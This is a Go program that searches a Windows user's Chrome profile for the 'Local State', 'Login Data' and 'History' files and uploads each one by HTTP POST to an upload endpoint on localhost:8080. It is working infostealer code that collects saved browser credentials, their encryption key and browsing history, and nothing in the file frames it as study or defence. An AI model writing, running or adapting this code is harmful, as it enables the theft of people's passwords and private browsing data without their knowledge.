package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"sync"
)

func findFiles(path string, filenames []string) ([]*os.File, error) {
	files := []*os.File{}
	err := filepath.Walk(path, func(currentPath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		for _, filename := range filenames {
			if info.Name() == filename {
				file, err := os.Open(currentPath)
				if err != nil {
					return err
				}
				files = append(files, file)
			}
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

func sendFile(browser string, file *os.File, wg *sync.WaitGroup) {
	defer wg.Done()

	var requestBody bytes.Buffer
	fullName := getFullName(file.Name(), browser)

	multiPartWriter := multipart.NewWriter(&requestBody)

	fileWriter, err := multiPartWriter.CreateFormFile("file", fullName)
	if err != nil {
		log.Fatalf("Error adding file to request: %v", err)
	}

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		log.Fatalf("Error copying file to request: %v", err)
	}

	multiPartWriter.Close()

	req, err := http.NewRequest(http.MethodPost, "http://localhost:8080/upload", &requestBody)
	if err != nil {
		log.Fatalf("Error creating request: %v", err)
	}

	req.Header.Add("Content-Type", multiPartWriter.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Error sending request: %v", err)
	}

	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Error reading response body: %v", err)
	}

	fmt.Printf("Response: %s\n", body)

}

func getFullName(path string, browser string) string {
	dirPath := filepath.Dir(path)
	parentFolderName := filepath.Base(dirPath)
	fileName := filepath.Base(path)

	fullName := parentFolderName + "_" + fileName + "_" + browser
	return fullName
}

func main() {
	filenames := []string{"Local State", "Login Data", "History"}
	usr, _ := user.Current()
	rootPath := filepath.Join(usr.HomeDir, "AppData", "Local", "Google", "Chrome", "User Data")
	filePointers, err := findFiles(rootPath, filenames)
	if err != nil {
		log.Fatalf("Error searching for files: %v", err)
	}

	var wg sync.WaitGroup

	for _, file := range filePointers {
		wg.Add(1)
		go sendFile("chrome", file, &wg)
	}

	wg.Wait()
}
